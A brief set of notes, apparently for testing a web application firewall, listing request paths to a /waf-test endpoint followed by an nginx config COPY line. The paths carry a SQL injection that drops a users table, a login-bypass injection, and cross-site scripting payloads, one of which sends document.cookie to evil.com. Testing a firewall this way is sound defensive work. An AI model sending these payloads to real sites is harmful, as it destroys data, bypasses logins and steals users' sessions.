/waf-test?q=1; DROP TABLE users--
/waf-test?q=<script>alert(document.cookie)</script>
/waf-test?q=<script>
fetch('https://evil.com/steal?c=' + document.cookie)
</script>
/waf-test?username=admin'--&password=anything

config location for nginx
COPY ./.conf /etc/nginx/templates/default.conf.template